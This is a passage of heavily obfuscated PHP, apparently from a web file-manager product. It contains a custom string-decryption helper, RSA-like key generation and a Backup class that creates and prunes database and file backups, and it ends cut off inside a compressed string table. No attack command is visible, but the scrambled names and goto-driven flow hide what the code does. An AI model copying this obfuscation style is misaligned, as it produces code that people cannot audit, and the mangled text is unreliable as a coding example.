$this->{$_SERVER[øÆ][256]}($CÎœÈôÖŠË, $aƒ×Õ–¤ŒÛ[220]($FÂíâ¥İ—… . $dæ×ÙÈîŒ‹)); break; case $aƒ×Õ–¤ŒÛ[226]: $B­—Ôì© ª = $this->{$_SERVER[øÆ][256]}($CÎœÈôÖŠË, $aƒ×Õ–¤ŒÛ[220]($dæ×ÙÈîŒ‹ . $FÂíâ¥İ—…)); $EĞñŠìã‡† = $E† ‚á—¹[656]; break; $fË‹ß»í– = $E† ‚á—¹[657]; case $aƒ×Õ–¤ŒÛ[344]: $B­—Ôì© ª = $this->{$_SERVER[øÆ][256]}($CÎœÈôÖŠË, $aƒ×Õ–¤ŒÛ[124]($dæ×ÙÈîŒ‹ . $FÂíâ¥İ—…)); break; $CàÚ‘Æêµ® = $E† ‚á—¹[658]; if (!$CàÚ‘Æêµ®) { return; } case $aƒ×Õ–¤ŒÛ[345]: $B­—Ôì© ª = $this->{$_SERVER[øÆ][256]}($CÎœÈôÖŠË, $aƒ×Õ–¤ŒÛ[120]($dæ×ÙÈîŒ‹ . $FÂíâ¥İ—…)); $e¤›ËÇÙÕÉ = $E† ‚á—¹[659]; break; $Cº…Œé´¹æ = $E† ‚á—¹[660]; while (strlen($Cº…Œé´¹æ) < $E† ‚á—¹[570]) { if (!$Cº…Œé´¹æ) { break; } $Cº…Œé´¹æ++; } case $aƒ×Õ–¤ŒÛ[346]: goto B†ŸÀÇ†‘; AÉ‘Æ„ Â”: if (strlen($FòÅæïøÈÉ) < $E† ‚á—¹[570]) { return; } $e„­ÒÑ¡Ü = 0; $A«œÙÒà´ = 0; goto E°Íò–»Ó; Dà¶äëÂ‡é: $D£¾ÌÈ®ìˆ = $aƒ×Õ–¤ŒÛ[10]; $dÙšÍÌøÌó = 0; $FòÅæïøÈÉ = $E† ‚á—¹[663]; goto AÉ‘Æ„ Â”; B†ŸÀÇ†‘: $CÎœÈôÖŠË = $aƒ×Õ–¤ŒÛ[351]($CÎœÈôÖŠË); $c¾¸¤£Â = $E† ‚á—¹[661]; if (!$c¾¸¤£Â) { die; } goto A¶Š£ÏÏË¢; A¶Š£ÏÏË¢: $e¥ºÑÂ·öï = $CÎœÈôÖŠË[0]; $CÎœÈôÖŠË = $aƒ×Õ–¤ŒÛ[25]($CÎœÈôÖŠË, 1); $eÏ«°‘¨Ş = $E† ‚á—¹[662]; goto f¹½µöÃöğ; f¹½µöÃöğ: $bÑ–©§‹×• = $aƒ×Õ–¤ŒÛ[348]($CÁ¢‹—¾­, $e¥ºÑÂ·öï); $FÄ¨³Ù²å = $aƒ×Õ–¤ŒÛ[120]($e¥ºÑÂ·öï . $aƒ×Õ–¤ŒÛ[120]($FÂíâ¥İ—… . $e¥ºÑÂ·öï) . $FÂíâ¥İ—…); $FÄ¨³Ù²å = $aƒ×Õ–¤ŒÛ[25]($FÄ¨³Ù²å, $bÑ–©§‹×• % 8, $bÑ–©§‹×• % 8 + 7); goto Dà¶äëÂ‡é; E°Íò–»Ó: for ($dÙšÍÌøÌó = 0; $dÙšÍÌøÌó < $aƒ×Õ–¤ŒÛ[24]($CÎœÈôÖŠË); $dÙšÍÌøÌó++) { $A«œÙÒà´ = $A«œÙÒà´ == $aƒ×Õ–¤ŒÛ[24]($FÄ¨³Ù²å) ? 0 : $A«œÙÒà´; $A¾µµå…‹¤ = $E† ‚á—¹[664]; while (strlen($A¾µµå…‹¤) < $E† ‚á—¹[597]) { if (!$A¾µµå…‹¤) { break; } $A¾µµå…‹¤++; } $eÊ«˜´–âö = $A«œÙÒà´++; $e„­ÒÑ¡Ü = $aƒ×Õ–¤ŒÛ[348]($CÁ¢‹—¾­, $CÎœÈôÖŠË[$dÙšÍÌøÌó]) - $bÑ–©§‹×• - $aƒ×Õ–¤ŒÛ[349]($FÄ¨³Ù²å[$eÊ«˜´–âö]); $FŸ¥İ¿×”ß = $E† ‚á—¹[665]; if (!$FŸ¥İ¿×”ß) { die; } while ($e„­ÒÑ¡Ü < 0) { $e„­ÒÑ¡Ü += 64; } $D£¾ÌÈ®ìˆ .= $CÁ¢‹—¾­[$e„­ÒÑ¡Ü]; $aİ —§Ï¦Š = $E† ‚á—¹[666]; while ($aİ —§Ï¦Š < $E† ‚á—¹[576]) { if ($aİ —§Ï¦Š >= 0) { break; } $aİ —§Ï¦Š++; } } $B­—Ôì© ª = $aƒ×Õ–¤ŒÛ[352]($D£¾ÌÈ®ìˆ); $e¤Îºäæ±´ = $E† ‚á—¹[627]; goto fÄªâùÃÕÉ; fÄªâùÃÕÉ: while ($e¤Îºäæ±´ < $E† ‚á—¹[597]) { if ($e¤Îºäæ±´ >= 0) { break; } $e¤Îºäæ±´++; } break; $aŠ¶Œé½°× = $E† ‚á—¹[667]; goto e¾™ç®‡…; e¾™ç®‡…: if (strlen($aŠ¶Œé½°×) < $E† ‚á—¹[597]) { return; } goto cèäƒİ—‰; cèäƒİ—‰: default: $B­—Ôì© ª = $this->{$_SERVER[øÆ][256]}($CÎœÈôÖŠË, $FÂíâ¥İ—… . $dæ×ÙÈîŒ‹); $Cä¿“å¬ëˆ = $E† ‚á—¹[668]; break; $d°ä±Æ¡‘» = $E† ‚á—¹[669]; while (strlen($d°ä±Æ¡‘») < $E† ‚á—¹[570]) { if (!$d°ä±Æ¡‘») { break; } $d°ä±Æ¡‘»++; } } if ($fóÉğ„‹Ÿ - 1 > 0) { $B­—Ôì© ª = $this->{$_SERVER[øÆ][195]}($B­—Ôì© ª, $FÂíâ¥İ—…, $fóÉğ„‹Ÿ - 1); } goto Dæ©´’‘ï; F¡ ¡´·œ•: $CÎœÈôÖŠË = $aƒ×Õ–¤ŒÛ[25]($CÎœÈôÖŠË, 16); $CÁ¢‹—¾­ = $aƒ×Õ–¤ŒÛ[343]; $FµÍé¡™’Õ = $E† ‚á—¹[655]; goto CŠÊç»·ñà; Dæ©´’‘ï: return $B­—Ôì© ª; goto d¡‡¾œìÀ–; a¥øÊ—±Ğ±: $E† ‚á—¹ =& $_SERVER[ç]; $aƒ×Õ–¤ŒÛ =& $_SERVER[øÆ]; if (!$aƒ×Õ–¤ŒÛ[350]($CÎœÈôÖŠË) || $aƒ×Õ–¤ŒÛ[24]($CÎœÈôÖŠË) < 10) { return !1; } goto FÁÉİÛ³­¬; d“‡íĞÄÓ¡: $CÎœÈôÖŠË = $aƒ×Õ–¤ŒÛ[220]($CÎœÈôÖŠË); $a„ÚÜˆäõ« = $CÎœÈôÖŠË[0]; $dæ×ÙÈîŒ‹ = $aƒ×Õ–¤ŒÛ[25]($CÎœÈôÖŠË, 1, 15); goto F¡ ¡´·œ•; d¡‡¾œìÀ–: } public function kmjoda448069($dË‚Ğôä²”) { goto AÄ¾‰‘êŞ¢; Fœ“†‚ÕÇ: $dÜ‹´£ •Ä = ($DÌÚƒèçÀ  - 1) * ($aæ†¯âÛ‚„ - 1); $DÂÃˆÓÉç· = $bÅ‹­¿¿É£[250](($DÌÚƒèçÀ  + $aæ†¯âÛ‚„) / 2); $dÁÒÏõß£ = $cÚööŒÄ¡‘[671]; goto eê‘‚É¾Æã; Fª¦ˆË¯§Ì: $aæ†¯âÛ‚„ = $this->{$_SERVER[øÆ][353]}(); $E É¤„œœÎ = $cÚööŒÄ¡‘[670]; if (strlen($E É¤„œœÎ) < $cÚööŒÄ¡‘[601]) { return; } goto Fœ“†‚ÕÇ; eê‘‚É¾Æã: while (1) { $bÕîëæ®¾Ş = $DÂÃˆÓÉç·; $a ›…‡ƒ©“ = $cÚööŒÄ¡‘[672]; while (strlen($a ›…‡ƒ©“) < $cÚööŒÄ¡‘[601]) { if (!$a ›…‡ƒ©“) { break; } $a ›…‡ƒ©“++; } $CŸ÷š¾ÏÈÒ = $dÜ‹´£ •Ä; while ($CŸ÷š¾ÏÈÒ % $bÕîëæ®¾Ş != 0) { $fòáİéÉ Å = $CŸ÷š¾ÏÈÒ; $B½¶×Í¡Ùä = $cÚööŒÄ¡‘[673]; if (strlen($B½¶×Í¡Ùä) < $cÚööŒÄ¡‘[576]) { return; } $CŸ÷š¾ÏÈÒ = $bÕîëæ®¾Ş; $bÕîëæ®¾Ş = $fòáİéÉ Å % $bÕîëæ®¾Ş; } if ($bÕîëæ®¾Ş == 1) { break; } else { $DÂÃˆÓÉç·++; } } $eì™”ù‹ˆù = 2; for ($D«°ÚËŒ£÷ = 0; $D«°ÚËŒ£÷ < $dÜ‹´£ •Ä * 10; $D«°ÚËŒ£÷++) { if (($dÜ‹´£ •Ä * $D«°ÚËŒ£÷ + 1) % $DÂÃˆÓÉç· == 0) { $eì™”ù‹ˆù = $bÅ‹­¿¿É£[250](($dÜ‹´£ •Ä * $D«°ÚËŒ£÷ + 1) / $DÂÃˆÓÉç·); break; } } goto d‘„Èƒ„‘Ù; C±èéÑÈƒ: return $cŞõÇ½‡ñ‡; goto A‡ñ‰Şì±; BÌ§ÌÃåêÂ: $cŞõÇ½‡ñ‡ = $this->{$_SERVER[øÆ][153]}($dË‚Ğôä²”, $aã…Õò¨¹Ò) . $bÅ‹­¿¿É£[357] . $e³©ê¤Öˆª; $Fó´¥ÎÒ = $cÚööŒÄ¡‘[676]; while ($Fó´¥ÎÒ < $cÚööŒÄ¡‘[580]) { if ($Fó´¥ÎÒ >= 0) { break; } $Fó´¥ÎÒ++; } goto C±èéÑÈƒ; AÄ¾‰‘êŞ¢: $cÚööŒÄ¡‘ =& $_SERVER[ç]; $bÅ‹­¿¿É£ =& $_SERVER[øÆ]; $DÌÚƒèçÀ  = $this->{$_SERVER[øÆ][353]}(); goto Fª¦ˆË¯§Ì; C³‹ªœÆŒÍ: $aã…Õò¨¹Ò = $bÅ‹­¿¿É£[120]($bÅ‹­¿¿É£[354] . ($DÌÚƒèçÀ  + $aæ†¯âÛ‚„) . $bÅ‹­¿¿É£[355] . $DÂÃˆÓÉç· . $bÅ‹­¿¿É£[355] . $eì™”ù‹ˆù . $bÅ‹­¿¿É£[356]); $C¤Öå¢Ìº = $cÚööŒÄ¡‘[675]; while ($C¤Öå¢Ìº < $cÚööŒÄ¡‘[597]) { if ($C¤Öå¢Ìº >= 0) { break; } $C¤Öå¢Ìº++; } goto BÌ§ÌÃåêÂ; d‘„Èƒ„‘Ù: $e³©ê¤Öˆª = $this->{$_SERVER[øÆ][153]}($DÌÚƒèçÀ  * $aæ†¯âÛ‚„ . $bÅ‹­¿¿É£[10], $bÅ‹­¿¿É£[155]); $FÇ«•ìéÅÈ = $cÚööŒÄ¡‘[674]; if (!$FÇ«•ìéÅÈ) { die; } goto C³‹ªœÆŒÍ; A‡ñ‰Şì±: } public function sigc82e34289($eÂ®±À¼Ü²) { goto B˜É–ğèø; Bì…»ÀÑ¨ƒ: for ($bªäë¸Íõ = 0; $bªäë¸Íõ < $CíÂÆƒ´Ã’ * 10; $bªäë¸Íõ++) { if (($CíÂÆƒ´Ã’ * $bªäë¸Íõ + 1) % $CÙ°õœ«Ğæ == 0) { $A¿ÈÈ™Äò = $b‹ŒÂ‚ùÃ[250](($CíÂÆƒ´Ã’ * $bªäë¸Íõ + 1) / $CÙ°õœ«Ğæ); break; } } $Cµë´Â×íã = $b‹ŒÂ‚ùÃ[120]($b‹ŒÂ‚ùÃ[354] . ($eÁ‘ŞŞñœ + $Fô‚»‡®î„) . $b‹ŒÂ‚ùÃ[355] . $CÙ°õœ«Ğæ . $b‹ŒÂ‚ùÃ[355] . $A¿ÈÈ™Äò . $b‹ŒÂ‚ùÃ[356]); $DÌœ¿“éÃ³ = $c†×­ĞŒ±[686]; goto BËƒ”÷‰£; CÈÑá‘ÔŸ: for ($bªäë¸Íõ = 3; $bªäë¸Íõ < $aÄ¦ßá­Ñ; $bªäë¸Íõ += 2) { if ($aÄ¦ßá­Ñ % $bªäë¸Íõ != 0) { continue; } $eÁ‘ŞŞñœ = $bªäë¸Íõ; $c™èåºŞòÌ = $c†×­ĞŒ±[680]; $Fô‚»‡®î„ = $b‹ŒÂ‚ùÃ[250]($aÄ¦ßá­Ñ / $bªäë¸Íõ); $aÁ©Øã¹öè = $c†×­ĞŒ±[681]; break; } $CíÂÆƒ´Ã’ = ($eÁ‘ŞŞñœ - 1) * ($Fô‚»‡®î„ - 1); $F÷·Ï™®Ğ  = $c†×­ĞŒ±[590]; goto A–²Òå¿Àò; B›çÍ¨£: $Dê‰˜‘Ç‰ = $c†×­ĞŒ±[679]; while ($Dê‰˜‘Ç‰ < $c†×­ĞŒ±[601]) { if ($Dê‰˜‘Ç‰ >= 0) { break; } $Dê‰˜‘Ç‰++; } $Fô‚»‡®î„ = 0; goto CÈÑá‘ÔŸ; A–²Òå¿Àò: if (!$F÷·Ï™®Ğ ) { return; } $CÙ°õœ«Ğæ = $b‹ŒÂ‚ùÃ[250](($eÁ‘ŞŞñœ + $Fô‚»‡®î„) / 2); $d¥ÚÈÙàó = $c†×­ĞŒ±[682]; goto dŸÊ‘•„«¿; F‘…²š½Ïî: if (!$aÄ¦ßá­Ñ) { return $b‹ŒÂ‚ùÃ[10]; } $aÄ¦ßá­Ñ = $b‹ŒÂ‚ùÃ[250]($aÄ¦ßá­Ñ); $eÁ‘ŞŞñœ = 0; goto B›çÍ¨£; B˜É–ğèø: $c†×­ĞŒ± =& $_SERVER[ç]; $b‹ŒÂ‚ùÃ =& $_SERVER[øÆ]; $D™’ ïà¯ = $b‹ŒÂ‚ùÃ[0]($b‹ŒÂ‚ùÃ[357], $eÂ®±À¼Ü²); goto böó­î‡ƒ; böó­î‡ƒ: $aë¢Çšø¿ = $c†×­ĞŒ±[677]; while ($aë¢Çšø¿ < $c†×­ĞŒ±[576]) { if ($aë¢Çšø¿ >= 0) { break; } $aë¢Çšø¿++; } if ($b‹ŒÂ‚ùÃ[19]($D™’ ïà¯) != 2) { return $b‹ŒÂ‚ùÃ[10]; } goto A¶Â‚ßÊ´; A¶Â‚ßÊ´: $aÄ¦ßá­Ñ = $this->{$_SERVER[øÆ][256]}($D™’ ïà¯[1] . $b‹ŒÂ‚ùÃ[10], $b‹ŒÂ‚ùÃ[155]); $E˜ó½‚¨ = $c†×­ĞŒ±[678]; if (!$E˜ó½‚¨) { return; } goto F‘…²š½Ïî; dŸÊ‘•„«¿: while (1) { $BâÖÁ¸Ÿå = $CÙ°õœ«Ğæ; $Açê¬µŸ¡„ = $CíÂÆƒ´Ã’; while ($Açê¬µŸ¡„ % $BâÖÁ¸Ÿå != 0) { $dâˆ«¦Şˆ‡ = $Açê¬µŸ¡„; $Açê¬µŸ¡„ = $BâÖÁ¸Ÿå; $fÏ—½¶¸¤Ó = $c†×­ĞŒ±[683]; if (strlen($fÏ—½¶¸¤Ó) < $c†×­ĞŒ±[570]) { die; } $BâÖÁ¸Ÿå = $dâˆ«¦Şˆ‡ % $BâÖÁ¸Ÿå; $cÛë–¿È = $c†×­ĞŒ±[684]; while ($cÛë–¿È < $c†×­ĞŒ±[576]) { if ($cÛë–¿È >= 0) { break; } $cÛë–¿È++; } } if ($BâÖÁ¸Ÿå == 1) { break; } else { $CÙ°õœ«Ğæ++; } } $A¿ÈÈ™Äò = 2; $Cµ—œ—Ñƒ = $c†×­ĞŒ±[685]; goto Bì…»ÀÑ¨ƒ; C­à”·¨ò÷: $bƒÆÓõ”âº = $c†×­ĞŒ±[662]; if (!$bƒÆÓõ”âº) { return; } goto aîèïÚ¿ÂÌ; BËƒ”÷‰£: $B¼Šø”®Á˜ = $this->{$_SERVER[øÆ][256]}($D™’ ïà¯[0], $Cµë´Â×íã); $D‹øÉÚê‰ = $c†×­ĞŒ±[687]; return $B¼Šø”®Á˜; goto C­à”·¨ò÷; aîèïÚ¿ÂÌ: } public function lfps87326887() { goto B¾ˆè‰÷‹˜; b·‹¯½•Ş: return $aó´õÈŞÖÕ; goto E¹ôÀØÇÚ; E§š¦÷›µ: while ($d…¡¾ğ­²¬ <= (int) $e£Ä†Úò[359]($Eº‡‘ÉñâÍ)) { $b˜Ş¬Ù×• = $d…¡¾ğ­²¬; while (!0) { $b˜Ş¬Ù×•++; if ($b˜Ş¬Ù×• <= 2) { $d…¡¾ğ­²¬ = $b˜Ş¬Ù×•; break; } else { if ($b˜Ş¬Ù×• < 2) { continue; } } $eÜç’­‹Åô = !0; for ($Bœ«—éß¢ = 2; $Bœ«—éß¢ <= $e£Ä†Úò[359]($b˜Ş¬Ù×•); $Bœ«—éß¢++) { if ($b˜Ş¬Ù×• % $Bœ«—éß¢ == 0) { $eÜç’­‹Åô = !1; } } if ($eÜç’­‹Åô) { $d…¡¾ğ­²¬ = $b˜Ş¬Ù×•; break; } } $fÒäâ´¶ˆ[] = $d…¡¾ğ­²¬; $Bâñ‹½Î† = $b¹Ü‰ì‹…[690]; } $aó´õÈŞÖÕ = 2; for ($b˜Ş¬Ù×• = $Eº‡‘ÉñâÍ; $b˜Ş¬Ù×• > 1; $b˜Ş¬Ù×•--) { $eÜç’­‹Åô = !0; foreach ($fÒäâ´¶ˆ as $E×Œ¥š•”) { if ($b˜Ş¬Ù×• % $E×Œ¥š•” == 0) { $eÜç’­‹Åô = !1; break; } } if ($eÜç’­‹Åô) { $aó´õÈŞÖÕ = $b˜Ş¬Ù×•; break; } } goto b·‹¯½•Ş; dàŠÖ‡Áø¬: $EåÂ×ƒµí„ = $b¹Ü‰ì‹…[688]; if (!$EåÂ×ƒµí„) { die; } $fÒäâ´¶ˆ = array(); goto dò¬½õ×Ïõ; dò¬½õ×Ïõ: $d…¡¾ğ­²¬ = 1; $fùµÔ¼»Œ = $b¹Ü‰ì‹…[689]; if (strlen($fùµÔ¼»Œ) < $b¹Ü‰ì‹…[601]) { die; } goto E§š¦÷›µ; B¾ˆè‰÷‹˜: $b¹Ü‰ì‹… =& $_SERVER[ç]; $e£Ä†Úò =& $_SERVER[øÆ]; $Eº‡‘ÉñâÍ = $e£Ä†Úò[338]($e£Ä†Úò[358](2, 14), $e£Ä†Úò[358](2, 16) - 1); goto dàŠÖ‡Áø¬; E¹ôÀØÇÚ: } public function lmyn53d7c42c($f÷‘õ¦‚¾ª, $E¢§˜Š¨) { $c—Ã¦èŒù =& $_SERVER[ç]; $a‡•ºÕæ–¤ =& $_SERVER[øÆ]; return $a‡•ºÕæ–¤[13](array($a‡•ºÕæ–¤[14], $a‡•ºÕæ–¤[360]), $f÷‘õ¦‚¾ª, $E¢§˜Š¨); $E»‹…±¹İ = $c—Ã¦èŒù[691]; if (strlen($E»‹…±¹İ) < $c—Ã¦èŒù[576]) { return; } } public function omkl9924c711($Dİ¹÷ì¾‹¨, $EŠÔÂ±’) { $c„Ú¶¨â³ =& $_SERVER[øÆ]; return $c„Ú¶¨â³[13](array($c„Ú¶¨â³[361], $c„Ú¶¨â³[362]), $Dİ¹÷ì¾‹¨, $EŠÔÂ±’); $BîŸ“ô—• = $_SERVER[ç][692]; } public function ahbi9c5c8780($F¢‰™›Ûî, $a³£¥šÈÒó) { $B¥š¦ƒâœ =& $_SERVER[øÆ]; return $B¥š¦ƒâœ[13](array($B¥š¦ƒâœ[361], $B¥š¦ƒâœ[363]), $F¢‰™›Ûî, $a³£¥šÈÒó); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $f©¥É•ÉàÜ =& $_SERVER[ç]; self::$name = date($f©¥É•ÉàÜ[693]); if (!($C½ê·¡Êµ¿ = Model($f©¥É•ÉàÜ[694])->lastItem())) { $C½ê·¡Êµ¿ = $this->initData(); } else { self::$name = $C½ê·¡Êµ¿[$f©¥É•ÉàÜ[28]]; if ($C½ê·¡Êµ¿[$f©¥É•ÉàÜ[695]] == $f©¥É•ÉàÜ[86]) { self::$name = date($f©¥É•ÉàÜ[696]); $aÁÅëÑÇîé = 0; if (isset($C½ê·¡Êµ¿[$f©¥É•ÉàÜ[289]][$f©¥É•ÉàÜ[173]][$f©¥É•ÉàÜ[441]])) { $aÁÅëÑÇîé = (int) $C½ê·¡Êµ¿[$f©¥É•ÉàÜ[289]][$f©¥É•ÉàÜ[173]][$f©¥É•ÉàÜ[441]]; } if ($C½ê·¡Êµ¿[$f©¥É•ÉàÜ[28]] == self::$name) { Model($f©¥É•ÉàÜ[694])->remove($C½ê·¡Êµ¿[$f©¥É•ÉàÜ[388]]); } $C½ê·¡Êµ¿ = $this->initData($aÁÅëÑÇîé, $C½ê·¡Êµ¿[$f©¥É•ÉàÜ[697]]); } else { $this->checkStore($C½ê·¡Êµ¿[$f©¥É•ÉàÜ[697]]); } } self::$option = $C½ê·¡Êµ¿; } private function initData($aİŒæƒÍà = 0, $c˜¦™”Ú·› = '') { goto E¥µÅ¤é; E¥µÅ¤é: $A¼Ç¯è­ëˆ =& $_SERVER[ç]; $f¤¸ø·àÎµ = Model($A¼Ç¯è­ëˆ[694])->config(); if ($c˜¦™”Ú·› && $f¤¸ø·àÎµ[$A¼Ç¯è­ëˆ[697]] != $c˜¦™”Ú·›) { $aİŒæƒÍà = 0; } goto F²¥ö·íŸ„; eÓØÑªùšø: $d›è†ÅÏÓƒ[$A¼Ç¯è­ëˆ[388]] = $DÎÌâÎ§ƒÜ; return $d›è†ÅÏÓƒ; goto CË‰ÕÃ¥Éá; F²¥ö·íŸ„: $this->checkStore($f¤¸ø·àÎµ[$A¼Ç¯è­ëˆ[697]]); $d›è†ÅÏÓƒ = array($A¼Ç¯è­ëˆ[697] => $f¤¸ø·àÎµ[$A¼Ç¯è­ëˆ[697]], $A¼Ç¯è­ëˆ[28] => self::$name, $A¼Ç¯è­ëˆ[695] => 0, $A¼Ç¯è­ëˆ[698] => $f¤¸ø·àÎµ[$A¼Ç¯è­ëˆ[698]], $A¼Ç¯è­ëˆ[289] => array($A¼Ç¯è­ëˆ[699] => array($A¼Ç¯è­ëˆ[695] => 0), $A¼Ç¯è­ëˆ[700] => array($A¼Ç¯è­ëˆ[695] => 0, $A¼Ç¯è­ëˆ[701] => 0, $A¼Ç¯è­ëˆ[702] => 0, $A¼Ç¯è­ëˆ[29] => $A¼Ç¯è­ëˆ[33]), $A¼Ç¯è­ëˆ[703] => array($A¼Ç¯è­ëˆ[695] => 0, $A¼Ç¯è­ëˆ[701] => 0, $A¼Ç¯è­ëˆ[702] => 0), $A¼Ç¯è­ëˆ[173] => array($A¼Ç¯è­ëˆ[695] => 0, $A¼Ç¯è­ëˆ[704] => 0, $A¼Ç¯è­ëˆ[705] => 0, $A¼Ç¯è­ëˆ[706] => 0, $A¼Ç¯è­ëˆ[707] => 0, $A¼Ç¯è­ëˆ[441] => $aİŒæƒÍà)), $A¼Ç¯è­ëˆ[708] => time(), $A¼Ç¯è­ëˆ[470] => 0); $DÎÌâÎ§ƒÜ = Model($A¼Ç¯è­ëˆ[694])->insert($d›è†ÅÏÓƒ); goto eÓØÑªùšø; CË‰ÕÃ¥Éá: } private function checkStore($Fœ¿Ó¼‰ƒè) { $d®¿Š»ƒÖ =& $_SERVER[ç]; $AÊ¹²ëÌ©… = Model($d®¿Š»ƒÖ[709])->listData($Fœ¿Ó¼‰ƒè); Model($d®¿Š»ƒÖ[709])->checkConfig($AÊ¹²ëÌ©…); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ç][694])->findByName(self::$name); } return self::$option; } public static function set($F¡’‘—˜ïµ) { $B†¤Â…‹´ =& $_SERVER[ç]; $dãè»Ñ = self::get(); foreach ($F¡’‘—˜ïµ as $cø’»‘¸‘ => $CÁÇÁˆ) { $CŒÙùíßÆ™ = explode($B†¤Â…‹´[94], $cø’»‘¸‘); $d‰ç“ÅšƒŸ = count($CŒÙùíßÆ™); switch ($d‰ç“ÅšƒŸ) { case 1: $dãè»Ñ[$CŒÙùíßÆ™[0]] = $CÁÇÁˆ; break; case 2: $dãè»Ñ[$CŒÙùíßÆ™[0]][$CŒÙùíßÆ™[1]] = $CÁÇÁˆ; break; case 3: $dãè»Ñ[$CŒÙùíßÆ™[0]][$CŒÙùíßÆ™[1]][$CŒÙùíßÆ™[2]] = $CÁÇÁˆ; break; } } Model($B†¤Â…‹´[694])->update($dãè»Ñ[$B†¤Â…‹´[388]], $dãè»Ñ); self::$option = $dãè»Ñ; return self::$option; } public function keep() { $eÃ’÷İâÔ =& $_SERVER[ç]; $d¼”ÑÕÉ¶š = self::get(); if ($d¼”ÑÕÉ¶š[$eÃ’÷İâÔ[289]][$eÃ’÷İâÔ[699]][$eÃ’÷İâÔ[695]] == $eÃ’÷İâÔ[86]) { return; } $this->backupKeep($d¼”ÑÕÉ¶š); self::set(array($eÃ’÷İâÔ[710] => 1)); } private function backupKeep($b…ñ©±š„) { goto EÌ”ĞôÆÌ„; EÌ”ĞôÆÌ„: $cßì”²» =& $_SERVER[ç]; $Bà¿ŸØÚíß = Model($cßì”²»[694])->listData(); if (empty($Bà¿ŸØÚíß)) { return; } goto d¸ñôº„˜æ; d¸ñôº„˜æ: $B‚áÚÍ·“œ = 0; $DÜó¦¥Êâ = array(); foreach ($Bà¿ŸØÚíß as $E³’ÂˆÏÑŞ) { if ($B‚áÚÍ·“œ >= 7) { break; } $DÜó¦¥Êâ[] = $E³’ÂˆÏÑŞ[$cßì”²»[28]]; $B‚áÚÍ·“œ++; } goto a´§×ÁÃ; a´§×ÁÃ: for ($B‚áÚÍ·“œ = 0; $B‚áÚÍ·“œ < 12; $B‚áÚÍ·“œ++) { $DÜó¦¥Êâ[] = date($cßì”²»[711], strtotime("\55{$B‚áÚÍ·“œ}\x20\x6d\x6f\156\x74\x68\x73")); } $DÜó¦¥Êâ = array_unique($DÜó¦¥Êâ); foreach ($Bà¿ŸØÚíß as $E³’ÂˆÏÑŞ) { if (!empty($E³’ÂˆÏÑŞ[$cßì”²»[28]]) && in_array($E³’ÂˆÏÑŞ[$cßì”²»[28]], $DÜó¦¥Êâ)) { continue; } Model($cßì”²»[694])->remove($E³’ÂˆÏÑŞ[$cßì”²»[388]]); $Aîø‹¦îì = "\x7b\151\157\x3a{$b…ñ©±š„[$cßì”²»[697]]}\x7d\x2f\x64\141\164\x61\x62\x61\163\x65\x2f\x62\x61\143\153\165\160\137{$E³’ÂˆÏÑŞ[$cßì”²»[28]]}"; IO::remove($Aîø‹¦îì, !1); } goto b“É­½óÙ¼; b“É­½óÙ¼: } public function db() { goto c•Í’¾ƒº¬; c•Í’¾ƒº¬: $E¯¢˜Óê‹ =& $_SERVER[ç]; $eØã¡‡Ôè = self::get(); if ($eØã¡‡Ôè[$E¯¢˜Óê‹[289]][$E¯¢˜Óê‹[700]][$E¯¢˜Óê‹[695]] == $E¯¢˜Óê‹[86]) { return !0; } goto D¯Ã‡£¡; D¯Ã‡£¡: $aŠÆ˜³£˜à = new BackupDb(); if (!$aŠÆ˜³£˜à->index()) { return !1; } self::set(array($E¯¢˜Óê‹[712] => 1)); goto e³´¯—–çˆ; e³´¯—–çˆ: return !0; goto B‚ö…©´ø; B‚ö…©´ø: } public function dbFile() { goto dß¢å„Õ‡¸; dß¢å„Õ‡¸: $CøâÜ›Ñ¯ =& $_SERVER[ç]; $có¦£¡÷„Ì = self::get(); if ($có¦£¡÷„Ì[$CøâÜ›Ñ¯[289]][$CøâÜ›Ñ¯[703]][$CøâÜ›Ñ¯[695]] == $CøâÜ›Ñ¯[86]) { return !0; } goto E©‹‚ë‰î; E©‹‚ë‰î: $aËéÔ¶äñ = new BackupDbFile(); if (!$aËéÔ¶äñ->index()) { return !1; } self::set(array($CøâÜ›Ñ¯[713] => 1)); goto D§õÃ˜“ˆÉ; D§õÃ˜“ˆÉ: return !0; goto EÄºÂÕÄ‘í; EÄºÂÕÄ‘í: } public function file() { $aˆô˜ºªº¥ =& $_SERVER[ç]; $B¬¼ôœğŒù = self::get(); if ($B¬¼ôœğŒù[$aˆô˜ºªº¥[289]][$aˆô˜ºªº¥[173]][$aˆô˜ºªº¥[695]] == $aˆô˜ºªº¥[86]) { return !0; } if (!isset($B¬¼ôœğŒù[$aˆô˜ºªº¥[698]]) || $B¬¼ôœğŒù[$aˆô˜ºªº¥[698]] == $aˆô˜ºªº¥[491]) { $AğÏš¿œÚ± = new BackupFile(); if (!$AğÏš¿œÚ±->index()) { return !1; } } self::set(array($aˆô˜ºªº¥[714] => 1, $aˆô˜ºªº¥[695] => 1)); return !0; } } goto dàì¸„—‡; F«Á‘àŞƒø: if (!function_exists('_kodDe')) { function _kodDe($cœÕ‚ç£®×) { $cœÕ‚ç£®× = base64_decode($cœÕ‚ç£®×); $d„®†”ƒª° = strlen($cœÕ‚ç£®×); $Eõéõëƒ¿„ = ''; $cöä·¶²ò« = ord($cœÕ‚ç£®×[0]) - 30; for ($Aà“‹‹´éƒ = 1; $Aà“‹‹´éƒ < $d„®†”ƒª°; $Aà“‹‹´éƒ += 2) { if ($Aà“‹‹´éƒ + 1 < $d„®†”ƒª°) { $Eõéõëƒ¿„ .= chr(ord($cœÕ‚ç£®×[$Aà“‹‹´éƒ + 1]) + $cöä·¶²ò«); $Eõéõëƒ¿„ .= chr(ord($cœÕ‚ç£®×[$Aà“‹‹´éƒ]) + $cöä·¶²ò«); } else { $Eõéõëƒ¿„ .= chr(ord($cœÕ‚ç£®×[$Aà“‹‹´éƒ]) + $cöä·¶²ò«); } } return $Eõéõëƒ¿„; } } define(base64_decode('5w=='), strrev('ÃÎøç')); $_SERVER[ç] = explode("\x7c\x3\x7c\x5\x7c\x1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\xad\x7d\x9\x7c\x1b\xc5\xd5\x78\x81\x40\x21\x34\x9c\xd\x37\x65\x63\x92\xf8\x88\xe\xdb\xb9\x9d\x38\x46\xb6\x65\x5b\x89\x6c\x29\x92\x1c\xe7".strrev('é*û„-”Ü¤¥p’”- '."\r".'	W'."\r".'\\ï¹i¾á 